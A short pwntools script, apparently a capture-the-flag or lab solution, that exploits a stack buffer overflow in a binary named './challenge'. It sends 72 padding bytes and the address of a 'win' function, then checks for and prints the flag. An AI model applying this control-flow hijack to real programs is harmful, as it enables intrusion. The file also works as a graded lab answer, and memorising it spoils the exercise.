from pwn import *
from labs.common.target import start_target

context.arch = "amd64"
io = start_target("./challenge")
io.recvuntil(b"name:\n")
elf = ELF("./challenge", checksec=False)
io.send(b"A" * 72 + p64(elf.symbols["win"]))
io.shutdown("send")
assert b"flag{ret2win}" in io.recvall(timeout=2)
print("flag{ret2win}")
